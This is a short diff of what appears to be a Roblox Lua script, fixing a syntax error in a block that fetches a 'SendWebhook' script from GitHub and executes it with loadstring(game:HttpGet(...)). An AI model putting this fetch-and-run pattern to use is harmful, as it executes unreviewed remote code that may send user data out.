@@ -3,4 +3,4 @@
 -- Gửi Webhook
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiriku2013/SendWebhook/refs/heads/main/SendWebhook.lua"))()
-end()
+end)
